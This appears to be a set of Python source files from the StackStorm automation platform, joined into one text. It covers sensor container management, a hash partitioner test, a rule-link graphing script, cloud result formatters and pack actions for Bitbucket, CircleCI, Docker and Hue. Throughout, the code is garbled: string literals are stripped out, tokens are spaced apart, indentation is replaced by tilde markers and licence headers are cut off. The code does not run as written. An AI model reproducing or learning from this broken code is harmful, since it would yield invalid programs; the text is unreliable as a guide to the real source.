\n 
\n 
class SensorContainerManager ( object ) : \n 
\n 
~~~ def __init__ ( self , sensors_partitioner ) : \n 
~~~ self . _sensor_container = None \n 
self . _sensors_watcher = SensorWatcher ( create_handler = self . _handle_create_sensor , \n 
update_handler = self . _handle_update_sensor , \n 
delete_handler = self . _handle_delete_sensor , \n 
queue_suffix = ) \n 
self . _container_thread = None \n 
if not sensors_partitioner : \n 
~~~ raise ValueError ( ) \n 
~~ self . _sensors_partitioner = sensors_partitioner \n 
\n 
~~ def run_sensors ( self ) : \n 
~~~ """\n        Run all sensors as determined by sensors_partitioner.\n        """ \n 
sensors = self . _sensors_partitioner . get_sensors ( ) \n 
if sensors : \n 
~~~ LOG . info ( , len ( sensors ) ) \n 
LOG . info ( , [ self . _get_sensor_ref ( sensor ) for sensor in sensors ] ) \n 
\n 
~~ sensors_to_run = [ ] \n 
for sensor in sensors : \n 
# TODO: Directly pass DB object to the ProcessContainer \n 
~~~ sensors_to_run . append ( self . _to_sensor_object ( sensor ) ) \n 
\n 
~~ LOG . info ( , os . getpid ( ) ) \n 
self . _setup_sigterm_handler ( ) \n 
self . _spin_container_and_wait ( sensors_to_run ) \n 
\n 
~~ def _spin_container_and_wait ( self , sensors ) : \n 
~~~ try : \n 
~~~ self . _sensor_container = ProcessSensorContainer ( sensors = sensors ) \n 
self . _container_thread = eventlet . spawn ( self . _sensor_container . run ) \n 
LOG . debug ( ) \n 
self . _sensors_watcher . start ( ) \n 
exit_code = self . _container_thread . wait ( ) \n 
LOG . error ( , exit_code ) \n 
LOG . error ( , os . getpid ( ) ) \n 
~~ except ( KeyboardInterrupt , SystemExit ) : \n 
~~~ self . _sensor_container . shutdown ( ) \n 
self . _sensors_watcher . stop ( ) \n 
\n 
LOG . info ( , os . getpid ( ) , \n 
sys . exc_info ( ) [ 0 ] . __name__ ) \n 
\n 
eventlet . kill ( self . _container_thread ) \n 
self . _container_thread = None \n 
\n 
return 0 \n 
\n 
~~ ~~ def _setup_sigterm_handler ( self ) : \n 
\n 
~~~ def sigterm_handler ( signum = None , frame = None ) : \n 
# This will cause SystemExit to be throw and we call sensor_container.shutdown() \n 
# there which cleans things up. \n 
~~~ sys . exit ( 0 ) \n 
\n 
# Register a SIGTERM signal handler which calls sys.exit which causes SystemExit to \n 
# be thrown. We catch SystemExit and handle cleanup there. \n 
~~ signal . signal ( signal . SIGTERM , sigterm_handler ) \n 
\n 
~~ def _to_sensor_object ( self , sensor_db ) : \n 
~~~ file_path = sensor_db . artifact_uri . replace ( , ) \n 
class_name = sensor_db . entry_point . split ( ) [ - 1 ] \n 
\n 
sensor_obj = { \n 
: sensor_db . pack , \n 
: file_path , \n 
: class_name , \n 
: sensor_db . trigger_types , \n 
: sensor_db . poll_interval , \n 
: self . _get_sensor_ref ( sensor_db ) \n 
} \n 
\n 
return sensor_obj \n 
\n 
################################################# \n 
# Event handler methods for the sensor CUD events \n 
################################################# \n 
\n 
~~ def _handle_create_sensor ( self , sensor ) : \n 
~~~ if not self . _sensors_partitioner . is_sensor_owner ( sensor ) : \n 
~~~ LOG . info ( , self . _get_sensor_ref ( sensor ) ) \n 
return \n 
~~ if not sensor . enabled : \n 
~~~ LOG . info ( , self . _get_sensor_ref ( sensor ) ) \n 
return \n 
~~ LOG . info ( , self . _get_sensor_ref ( sensor ) ) \n 
self . _sensor_container . add_sensor ( sensor = self . _to_sensor_object ( sensor ) ) \n 
\n 
~~ def _handle_update_sensor ( self , sensor ) : \n 
~~~ if not self . _sensors_partitioner . is_sensor_owner ( sensor ) : \n 
~~~ LOG . info ( , self . _get_sensor_ref ( sensor ) ) \n 
return \n 
~~ sensor_ref = self . _get_sensor_ref ( sensor ) \n 
sensor_obj = self . _to_sensor_object ( sensor ) \n 
\n 
# Handle disabling sensor \n 
if not sensor . enabled : \n 
~~~ LOG . info ( , sensor_ref ) \n 
self . _sensor_container . remove_sensor ( sensor = sensor_obj ) \n 
return \n 
\n 
~~ LOG . info ( , sensor_ref ) \n 
try : \n 
~~~ self . _sensor_container . remove_sensor ( sensor = sensor_obj ) \n 
~~ except : \n 
~~~ LOG . exception ( , sensor_ref ) \n 
~~ else : \n 
~~~ self . _sensor_container . add_sensor ( sensor = sensor_obj ) \n 
LOG . info ( , sensor_ref ) \n 
\n 
~~ ~~ def _handle_delete_sensor ( self , sensor ) : \n 
~~~ if not self . _sensors_partitioner . is_sensor_owner ( sensor ) : \n 
~~~ LOG . info ( , self . _get_sensor_ref ( sensor ) ) \n 
return \n 
~~ LOG . info ( , self . _get_sensor_ref ( sensor ) ) \n 
self . _sensor_container . remove_sensor ( sensor = self . _to_sensor_object ( sensor ) ) \n 
\n 
~~ def _get_sensor_ref ( self , sensor ) : \n 
~~~ return ResourceReference . to_string_reference ( pack = sensor . pack , name = sensor . name ) \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ import math \n 
from random_words import RandomWords \n 
\n 
from st2reactor . container . hash_partitioner import HashPartitioner , Range \n 
from st2tests import config \n 
from st2tests import DbTestCase \n 
from st2tests . fixturesloader import FixturesLoader \n 
\n 
PACK = \n 
FIXTURES_1 = { \n 
: [ , , ] \n 
} \n 
\n 
\n 
class HashPartitionerTest ( DbTestCase ) : \n 
\n 
~~~ models = None \n 
\n 
@ classmethod \n 
def setUpClass ( cls ) : \n 
~~~ super ( HashPartitionerTest , cls ) . setUpClass ( ) \n 
# Create TriggerTypes before creation of Rule to avoid failure. Rule requires the \n 
# Trigger and therefore TriggerType to be created prior to rule creation. \n 
cls . models = FixturesLoader ( ) . save_fixtures_to_db ( \n 
fixtures_pack = PACK , fixtures_dict = FIXTURES_1 ) \n 
config . parse_args ( ) \n 
\n 
~~ def test_full_range_hash_partitioner ( self ) : \n 
~~~ partitioner = HashPartitioner ( , ) \n 
sensors = partitioner . get_sensors ( ) \n 
self . assertEqual ( len ( sensors ) , 3 , ) \n 
\n 
~~ def test_multi_range_hash_partitioner ( self ) : \n 
~~~ range_third = int ( Range . RANGE_MAX_VALUE / 3 ) \n 
range_two_third = range_third * 2 \n 
hash_ranges = . format ( \n 
range_third = range_third , range_two_third = range_two_third ) \n 
partitioner = HashPartitioner ( , hash_ranges ) \n 
sensors = partitioner . get_sensors ( ) \n 
self . assertEqual ( len ( sensors ) , 3 , ) \n 
\n 
~~ def test_split_range_hash_partitioner ( self ) : \n 
~~~ range_mid = int ( Range . RANGE_MAX_VALUE / 2 ) \n 
partitioner = HashPartitioner ( , % range_mid ) \n 
sensors1 = partitioner . get_sensors ( ) \n 
\n 
partitioner = HashPartitioner ( , % range_mid ) \n 
sensors2 = partitioner . get_sensors ( ) \n 
\n 
self . assertEqual ( len ( sensors1 ) + len ( sensors2 ) , 3 , ) \n 
\n 
~~ def test_hash_effectiveness ( self ) : \n 
~~~ range_third = int ( Range . RANGE_MAX_VALUE / 3 ) \n 
partitioner1 = HashPartitioner ( , % range_third ) \n 
partitioner2 = HashPartitioner ( , % ( range_third , range_third + range_third ) ) partitioner3 = HashPartitioner ( , % ( range_third + range_third ) ) \n 
\n 
refs_count = 1000 \n 
\n 
refs = self . _generate_refs ( count = refs_count ) \n 
\n 
p1_count = 0 \n 
p2_count = 0 \n 
p3_count = 0 \n 
\n 
for ref in refs : \n 
~~~ if partitioner1 . _is_in_hash_range ( ref ) : \n 
~~~ p1_count += 1 \n 
# note if and not else-if. \n 
~~ if partitioner2 . _is_in_hash_range ( ref ) : \n 
~~~ p2_count += 1 \n 
~~ if partitioner3 . _is_in_hash_range ( ref ) : \n 
~~~ p3_count += 1 \n 
\n 
~~ ~~ self . assertEqual ( p1_count + p2_count + p3_count , refs_count , \n 
) \n 
\n 
# Test effectiveness by checking if the  sd is within 20% of mean \n 
mean = refs_count / 3 \n 
variance = float ( ( p1_count - mean ) ** 2 + ( p1_count - mean ) ** 2 + ( p3_count - mean ) ** 2 ) / 3 \n 
sd = math . sqrt ( variance ) \n 
\n 
self . assertTrue ( sd / mean <= 0.2 , ) \n 
\n 
~~ def _generate_refs ( self , count = 10 ) : \n 
~~~ random_word_count = int ( math . sqrt ( count ) ) + 1 \n 
words = RandomWords ( ) . random_words ( count = random_word_count ) \n 
x_index = 0 \n 
y_index = 0 \n 
while count > 0 : \n 
~~~ yield % ( words [ x_index ] , words [ y_index ] ) \n 
if y_index < len ( words ) - 1 : \n 
~~~ y_index += 1 \n 
~~ else : \n 
~~~ x_index += 1 \n 
y_index = 0 \n 
~~ count -= 1 \n 
~~ return \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ from unittest2 import TestCase \n 
\n 
from st2actions . runners . utils import get_action_class_instance \n 
from st2tests . mocks . action import MockActionWrapper \n 
from st2tests . mocks . action import MockActionService \n 
\n 
\n 
__all__ = [ \n 
\n 
] \n 
\n 
\n 
class BaseActionTestCase ( TestCase ) : \n 
~~~ """\n    Base class for Python runner action tests.\n    """ \n 
\n 
action_cls = None \n 
\n 
def setUp ( self ) : \n 
~~~ super ( BaseActionTestCase , self ) . setUp ( ) \n 
\n 
class_name = self . action_cls . __name__ \n 
action_wrapper = MockActionWrapper ( pack = , class_name = class_name ) \n 
self . action_service = MockActionService ( action_wrapper = action_wrapper ) \n 
\n 
~~ def get_action_instance ( self , config = None ) : \n 
~~~ """\n        Retrieve instance of the action class.\n        """ \n 
# pylint: disable=not-callable \n 
instance = get_action_class_instance ( action_cls = self . action_cls , \n 
config = config , \n 
action_service = self . action_service ) \n 
return instance \n 
#!/usr/bin/env python \n 
\n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
\n 
~~ ~~ """\nVisualize the links created by rules.\n\n1. requires graphviz\n        pip install graphviz\n        apt-get install graphviz\n\nTo run :\n    ./st2-analyze-links.py --action_ref <action-ref>\n\nThe command must run on a StackStorm box.\n""" \n 
\n 
import os \n 
import sets \n 
\n 
from oslo_config import cfg \n 
\n 
from st2common import config \n 
from st2common . util . monkey_patch import monkey_patch \n 
from st2common . persistence . rule import Rule \n 
from st2common . service_setup import db_setup \n 
\n 
try : \n 
~~~ from graphviz import Digraph \n 
~~ except ImportError : \n 
~~~ msg = ( \'Missing "graphviz" dependency. You can install it using pip: \\n\' \n 
) \n 
raise ImportError ( msg ) \n 
\n 
\n 
~~ def do_register_cli_opts ( opts , ignore_errors = False ) : \n 
~~~ for opt in opts : \n 
~~~ try : \n 
~~~ cfg . CONF . register_cli_opt ( opt ) \n 
~~ except : \n 
~~~ if not ignore_errors : \n 
~~~ raise \n 
\n 
\n 
~~ ~~ ~~ ~~ class RuleLink ( object ) : \n 
\n 
~~~ def __init__ ( self , source_action_ref , rule_ref , dest_action_ref ) : \n 
~~~ self . _source_action_ref = source_action_ref \n 
self . _rule_ref = rule_ref \n 
self . _dest_action_ref = dest_action_ref \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return % ( self . _source_action_ref , self . _rule_ref , self . _dest_action_ref ) \n 
\n 
~~ ~~ class LinksAnalyzer ( object ) : \n 
\n 
~~~ def __init__ ( self ) : \n 
~~~ self . _rule_link_by_action_ref = { } \n 
self . _rules = { } \n 
\n 
~~ def analyze ( self , root_action_ref , link_tigger_ref ) : \n 
~~~ rules = Rule . query ( trigger = link_tigger_ref , enabled = True ) \n 
# pprint.pprint([rule.ref for rule in rules]) \n 
for rule in rules : \n 
~~~ source_action_ref = self . _get_source_action_ref ( rule ) \n 
if not source_action_ref : \n 
~~~ print % rule . ref \n 
continue \n 
~~ rule_links = self . _rules . get ( source_action_ref , None ) \n 
if rule_links is None : \n 
~~~ rule_links = [ ] \n 
self . _rules [ source_action_ref ] = rule_links \n 
~~ rule_links . append ( RuleLink ( source_action_ref = source_action_ref , rule_ref = rule . ref , \n 
dest_action_ref = rule . action . ref ) ) \n 
~~ analyzed = self . _do_analyze ( action_ref = root_action_ref ) \n 
for ( depth , rule_link ) in analyzed : \n 
~~~ print % ( * depth , rule_link ) \n 
~~ return analyzed \n 
\n 
~~ def _get_source_action_ref ( self , rule ) : \n 
~~~ criteria = rule . criteria \n 
source_action_ref = criteria . get ( , None ) \n 
if not source_action_ref : \n 
~~~ source_action_ref = criteria . get ( , None ) \n 
~~ return source_action_ref [ ] if source_action_ref else None \n 
\n 
~~ def _do_analyze ( self , action_ref , rule_links = None , processed = None , depth = 0 ) : \n 
~~~ if processed is None : \n 
~~~ processed = sets . Set ( ) \n 
~~ if rule_links is None : \n 
~~~ rule_links = [ ] \n 
~~ processed . add ( action_ref ) \n 
for rule_link in self . _rules . get ( action_ref , [ ] ) : \n 
~~~ rule_links . append ( ( depth , rule_link ) ) \n 
if rule_link . _dest_action_ref in processed : \n 
~~~ continue \n 
~~ self . _do_analyze ( rule_link . _dest_action_ref , rule_links = rule_links , \n 
processed = processed , depth = depth + 1 ) \n 
~~ return rule_links \n 
\n 
\n 
~~ ~~ class Grapher ( object ) : \n 
~~~ def generate_graph ( self , rule_links , out_file ) : \n 
~~~ graph_label = \n 
\n 
graph_attr = { \n 
: , \n 
: , \n 
: , \n 
: graph_label \n 
} \n 
node_attr = { } \n 
dot = Digraph ( comment = , \n 
node_attr = node_attr , graph_attr = graph_attr , format = ) \n 
\n 
nodes = sets . Set ( ) \n 
for _ , rule_link in rule_links : \n 
~~~ print rule_link . _source_action_ref \n 
if rule_link . _source_action_ref not in nodes : \n 
~~~ nodes . add ( rule_link . _source_action_ref ) \n 
dot . node ( rule_link . _source_action_ref , rule_link . _source_action_ref ) \n 
~~ if rule_link . _dest_action_ref not in nodes : \n 
~~~ nodes . add ( rule_link . _dest_action_ref ) \n 
dot . node ( rule_link . _dest_action_ref , rule_link . _dest_action_ref ) \n 
~~ dot . edge ( rule_link . _source_action_ref , rule_link . _dest_action_ref , constraint = , \n 
label = rule_link . _rule_ref ) \n 
~~ output_path = os . path . join ( os . getcwd ( ) , out_file ) \n 
dot . format = \n 
dot . render ( output_path ) \n 
\n 
\n 
~~ ~~ def main ( ) : \n 
~~~ monkey_patch ( ) \n 
\n 
cli_opts = [ \n 
cfg . StrOpt ( , default = None , \n 
help = ) , \n 
cfg . StrOpt ( , default = , \n 
help = ) , \n 
cfg . StrOpt ( , default = ) \n 
] \n 
do_register_cli_opts ( cli_opts ) \n 
config . parse_args ( ) \n 
db_setup ( ) \n 
rule_links = LinksAnalyzer ( ) . analyze ( cfg . CONF . action_ref , cfg . CONF . link_trigger_ref ) \n 
Grapher ( ) . generate_graph ( rule_links , cfg . CONF . out_file ) \n 
\n 
\n 
~~ if __name__ == : \n 
~~~ main ( ) \n 
~~ import boto \n 
import six \n 
\n 
\n 
class FieldLists ( ) : \n 
~~~ ADDRESS = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
\n 
] \n 
\n 
BLOCK_DEVICE_TYPE = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
\n 
] \n 
\n 
BUCKET = [ \n 
, \n 
, \n 
, \n 
\n 
] \n 
\n 
EC2ZONE = [ \n 
, \n 
, \n 
, \n 
\n 
] \n 
\n 
INSTANCE = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
] \n 
\n 
RECORD = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
\n 
] \n 
\n 
R53ZONE = [ \n 
, \n 
, \n 
, \n 
, \n 
\n 
] \n 
\n 
R53STATUS = [ \n 
, \n 
, \n 
, \n 
\n 
] \n 
\n 
VOLUME = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
\n 
] \n 
\n 
TAG = [ \n 
, \n 
, \n 
, \n 
\n 
] \n 
\n 
STACK = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
\n 
] \n 
\n 
DBINSTANCE = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
\n 
] \n 
\n 
\n 
~~ class ResultSets ( object ) : \n 
\n 
~~~ def __init__ ( self ) : \n 
~~~ self . foo = \n 
\n 
~~ def selector ( self , output ) : \n 
~~~ if isinstance ( output , boto . ec2 . instance . Reservation ) : \n 
~~~ return self . parseReservation ( output ) \n 
~~ elif isinstance ( output , boto . ec2 . instance . Instance ) : \n 
~~~ return self . parseInstance ( output ) \n 
~~ elif isinstance ( output , boto . ec2 . volume . Volume ) : \n 
~~~ return self . parseVolume ( output ) \n 
~~ elif isinstance ( output , boto . ec2 . blockdevicemapping . BlockDeviceType ) : \n 
~~~ return self . parseBlockDeviceType ( output ) \n 
~~ elif isinstance ( output , boto . ec2 . zone . Zone ) : \n 
~~~ return self . parseEC2Zone ( output ) \n 
~~ elif isinstance ( output , boto . ec2 . address . Address ) : \n 
~~~ return self . parseAddress ( output ) \n 
~~ elif isinstance ( output , boto . route53 . record . Record ) : \n 
~~~ return self . parseRecord ( output ) \n 
~~ elif isinstance ( output , boto . route53 . zone . Zone ) : \n 
~~~ return self . parseR53Zone ( output ) \n 
~~ elif isinstance ( output , boto . route53 . status . Status ) : \n 
~~~ return self . parseR53Status ( output ) \n 
~~ elif isinstance ( output , boto . ec2 . tag . Tag ) : \n 
~~~ return self . parseTag ( output ) \n 
~~ elif isinstance ( output , boto . ec2 . ec2object . EC2Object ) : \n 
~~~ return self . parseEC2Object ( output ) \n 
~~ elif isinstance ( output , boto . cloudformation . stack . Stack ) : \n 
~~~ return self . parseStackObject ( output ) \n 
~~ elif isinstance ( output , boto . rds . dbinstance . DBInstance ) : \n 
~~~ return self . parseDBInstanceObject ( output ) \n 
~~ else : \n 
~~~ return output \n 
\n 
~~ ~~ def formatter ( self , output ) : \n 
~~~ if isinstance ( output , list ) : \n 
~~~ return [ self . formatter ( item ) for item in output ] \n 
~~ elif isinstance ( output , dict ) : \n 
~~~ return { key : self . formatter ( value ) for key , value in six . iteritems ( output ) } \n 
~~ else : \n 
~~~ return self . selector ( output ) \n 
\n 
~~ ~~ def parseReservation ( self , output ) : \n 
~~~ instance_list = [ ] \n 
for instance in output . instances : \n 
~~~ instance_data = self . parseInstance ( instance ) \n 
instance_data [ ] = output . owner_id \n 
instance_list . append ( instance_data ) \n 
~~ return instance_list \n 
\n 
~~ def parseAddress ( self , output ) : \n 
~~~ instance_data = { field : getattr ( output , field ) for field in FieldLists . ADDRESS } \n 
return instance_data \n 
\n 
~~ def parseInstance ( self , output ) : \n 
~~~ instance_data = { field : getattr ( output , field ) for field in FieldLists . INSTANCE } \n 
return instance_data \n 
\n 
~~ def parseVolume ( self , output ) : \n 
~~~ volume_data = { field : getattr ( output , field ) for field in FieldLists . VOLUME } \n 
return volume_data \n 
\n 
~~ def parseBlockDeviceType ( self , output ) : \n 
~~~ data = { field : getattr ( output , field ) for field in FieldLists . BLOCK_DEVICE_TYPE } \n 
return data \n 
\n 
~~ def parseEC2Zone ( self , output ) : \n 
~~~ zone_data = { field : getattr ( output , field ) for field in FieldLists . EC2ZONE } \n 
return zone_data \n 
\n 
~~ def parseRecord ( self , output ) : \n 
~~~ record_data = { field : getattr ( output , field ) for field in FieldLists . RECORD } \n 
return record_data \n 
\n 
~~ def parseR53Zone ( self , output ) : \n 
~~~ zone_data = { field : getattr ( output , field ) for field in FieldLists . R53ZONE } \n 
return zone_data \n 
\n 
~~ def parseR53Status ( self , output ) : \n 
~~~ status_data = { field : getattr ( output , field ) for field in FieldLists . R53STATUS } \n 
return status_data \n 
\n 
~~ def parseBucket ( self , output ) : \n 
~~~ bucket_data = { field : getattr ( output , field ) for field in FieldLists . BUCKET } \n 
return bucket_data \n 
\n 
~~ def parseTag ( self , output ) : \n 
~~~ tag_data = { field : getattr ( output , field ) for field in FieldLists . TAG } \n 
return tag_data \n 
\n 
~~ def parseStackObject ( self , output ) : \n 
~~~ stack_data = { field : getattr ( output , field ) for field in FieldLists . STACK } \n 
return stack_data \n 
\n 
~~ def parseDBInstanceObject ( self , output ) : \n 
~~~ dbinstance_data = { field : getattr ( output , field ) for field in FieldLists . DBINSTANCE } \n 
return dbinstance_data \n 
\n 
~~ def parseEC2Object ( self , output ) : \n 
# Looks like everything that is an EC2Object pretty much only has these extra \n 
\n 
~~~ output = vars ( output ) \n 
del output [ ] \n 
# special handling for region since name here is better than id. \n 
region = output . get ( , None ) \n 
output [ ] = region . name if region else \n 
# now anything that is an EC2Object get some special marshalling care. \n 
for k , v in six . iteritems ( output ) : \n 
~~~ if isinstance ( v , boto . ec2 . ec2object . EC2Object ) : \n 
# Better not to assume each EC2Object has an id. If not found \n 
# resort to the str of the object which should have something meaningful. \n 
~~~ output [ k ] = getattr ( v , , str ( v ) ) \n 
# Generally unmarshallable object might be hiding in list so better to \n 
~~ if isinstance ( v , list ) : \n 
~~~ v_list = [ ] \n 
for item in v : \n 
# avoid touching the basic types. \n 
~~~ if isinstance ( item , ( basestring , bool , int , long , float ) ) : \n 
~~~ v_list . append ( v ) \n 
~~ else : \n 
~~~ v_list . append ( str ( item ) ) \n 
~~ ~~ output [ k ] = v_list \n 
~~ ~~ return output \n 
~~ ~~ from st2actions . runners . pythonrunner import Action \n 
from bitbucket . bitbucket import Bitbucket \n 
\n 
\n 
class BitBucketAction ( Action ) : \n 
~~~ def __init__ ( self , config ) : \n 
~~~ super ( BitBucketAction , self ) . __init__ ( config ) \n 
\n 
~~ def _get_client ( self , repo = None ) : \n 
~~~ if repo : \n 
~~~ bb = Bitbucket ( username = self . config [ ] , \n 
password = self . config [ ] , \n 
repo_name_or_slug = repo ) \n 
~~ else : \n 
~~~ bb = Bitbucket ( username = self . config [ ] , \n 
password = self . config [ ] ) \n 
~~ return bb \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
\n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
\n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ import json \n 
\n 
from flask import Flask , request , abort \n 
from st2reactor . sensor . base import Sensor \n 
\n 
TRIGGER_REF = \n 
\n 
\n 
class CircleCIWebhookSensor ( Sensor ) : \n 
\n 
~~~ def setup ( self ) : \n 
~~~ self . host = self . _config [ ] \n 
self . port = self . _config [ ] \n 
self . _endpoints = self . _config [ ] \n 
self . app = Flask ( __name__ ) \n 
self . trigger_ref = TRIGGER_REF \n 
self . log = self . _sensor_service . get_logger ( __name__ ) \n 
\n 
@ self . app . route ( ) \n 
def status ( ) : \n 
~~~ return json . dumps ( { : } ) \n 
\n 
~~ @ self . app . route ( , methods = [ ] ) \n 
def build_events ( endpoint ) : \n 
\n 
~~~ if endpoint not in self . _endpoints : \n 
~~~ self . log . error ( , endpoint ) \n 
abort ( 404 ) \n 
\n 
~~ webhook_body = request . get_json ( ) \n 
payload = { } \n 
payload [ ] = self . _get_headers_as_dict ( request . headers ) \n 
payload [ ] = webhook_body \n 
\n 
response = self . _sensor_service . dispatch ( self . trigger_ref , payload ) \n 
self . log . debug ( json . dumps ( response ) ) \n 
return json . dumps ( { : } ) \n 
\n 
~~ ~~ def run ( self ) : \n 
~~~ self . app . run ( host = self . host , port = self . port , threaded = True ) \n 
\n 
~~ def cleanup ( self ) : \n 
# This is called when the st2 system goes down. You can perform cleanup operations like \n 
# closing the connections to external system here. \n 
~~~ pass \n 
\n 
~~ def _get_headers_as_dict ( self , headers ) : \n 
~~~ headers_dict = { } \n 
for key , value in headers : \n 
~~~ headers_dict [ key ] = value \n 
~~ return headers_dict \n 
\n 
~~ def add_trigger ( self , trigger ) : \n 
~~~ pass \n 
\n 
~~ def update_trigger ( self , trigger ) : \n 
~~~ pass \n 
\n 
~~ def remove_trigger ( self , trigger ) : \n 
~~~ pass \n 
~~ ~~ from libcloud . loadbalancer . base import Algorithm \n 
\n 
from lib . actions import BaseAction \n 
\n 
__all__ = [ \n 
\n 
] \n 
\n 
\n 
class CreateBalancerAction ( BaseAction ) : \n 
\n 
~~~ def run ( self , region , network_domain_id , name , port , protocol , \n 
algorithm = Algorithm . ROUND_ROBIN ) : \n 
~~~ driver = self . _get_lb_driver ( region ) \n 
\n 
# Use a local lookup - these maps are protected fields of each driver \n 
_VALUE_TO_ALGORITHM_MAP = { \n 
: Algorithm . ROUND_ROBIN , \n 
: Algorithm . LEAST_CONNECTIONS , \n 
: Algorithm . SHORTEST_RESPONSE , \n 
: Algorithm . PERSISTENT_IP \n 
} \n 
\n 
if algorithm is not Algorithm . ROUND_ROBIN : \n 
~~~ algorithm = _VALUE_TO_ALGORITHM_MAP [ algorithm ] \n 
~~ driver . network_domain_id = network_domain_id \n 
record = driver . create_balancer ( name = name , \n 
port = port , \n 
protocol = protocol , \n 
algorithm = algorithm , \n 
members = None ) \n 
\n 
return self . resultsets . formatter ( record ) \n 
~~ ~~ from lib . base import DockerBasePythonAction \n 
\n 
\n 
__all__ = [ \n 
\n 
] \n 
\n 
\n 
class DockerPullImageAction ( DockerBasePythonAction ) : \n 
~~~ def run ( self , repo , tag = None , insecure_registry = False , \n 
auth_username_override = None , auth_password_override = None ) : \n 
~~~ auth_override = ( auth_username_override and auth_password_override ) \n 
\n 
if auth_override : \n 
~~~ auth_config = { } \n 
auth_config [ ] = auth_username_override \n 
auth_config [ ] = auth_password_override \n 
return self . wrapper . pull ( repo = repo , tag = tag , insecure_registry = insecure_registry , \n 
auth_config = auth_config ) \n 
~~ else : \n 
~~~ return self . wrapper . pull ( repo = repo , tag = tag , insecure_registry = insecure_registry ) \n 
~~ ~~ ~~ from lib . actions import BaseAction \n 
\n 
\n 
class ViewAXConfig ( BaseAction ) : \n 
~~~ def run ( self ) : \n 
~~~ response = self . _api_get ( ) \n 
return response \n 
~~ ~~ from lib import action \n 
\n 
\n 
class ColorTempKelvinAction ( action . BaseAction ) : \n 
~~~ def run ( self , light_id , temperature , transition_time ) : \n 
~~~ light = self . hue . lights . get ( light_id ) \n 
light . ct ( temperature , transition_time ) \n 
~~ ~~ from st2actions . runners . pythonrunner import Action \n 
\n 
\n 
class BaseAction ( Action ) : \n 
~~~ def __init__ ( self , config ) : \n 
~~~ super ( BaseAction , self ) . __init__ ( config ) \n 
#!/usr/bin/env python \n 
\n 
~~ ~~ import libcloud . compute . base as compute_base \n 
import libcloud . dns . base as dns_base \n 
import libcloud . loadbalancer . base as lb_base \n 
import libcloud . container . base as container_base \n 
\n 
__all__ = [ \n 
, \n 
\n 
] \n 
\n 
\n 
class FieldLists ( object ) : \n 
~~~ """\n    The lists of fields we want to return for each class\n    """ \n 
NODE = [ , , , , , , ] \n 
NODE_SIZE = [ , , , , , ] \n 
NODE_IMAGE = [ , ] \n 
LOCATION = [ , , ] \n 
NODE_KEY = [ ] \n 
NODE_PASSWORD = [ , ] \n 
STORAGE_VOLUME = [ , , , ] \n 
VOLUME_SNAPSHOT = [ , , ] \n 
ZONE = [ , , , ] \n 
RECORD = [ , , , , ] \n 
MEMBER = [ , , , ] \n 
BALANCER = [ , , , ] \n 
CONTAINER = [ , , ] \n 
CONTAINER_IMAGE = [ , , , ] \n 
CONTAINER_CLUSTER = [ , ] \n 
\n 
\n 
~~ class ResultSets ( object ) : \n 
\n 
~~~ def selector ( self , output ) : \n 
~~~ if isinstance ( output , compute_base . Node ) : \n 
~~~ return self . parse ( output , FieldLists . NODE ) \n 
~~ elif isinstance ( output , compute_base . NodeSize ) : \n 
~~~ return self . parse ( output , FieldLists . NODE_SIZE ) \n 
~~ elif isinstance ( output , compute_base . NodeImage ) : \n 
~~~ return self . parse ( output , FieldLists . NODE_IMAGE ) \n 
~~ elif isinstance ( output , compute_base . NodeLocation ) : \n 
~~~ return self . parse ( output , FieldLists . LOCATION ) \n 
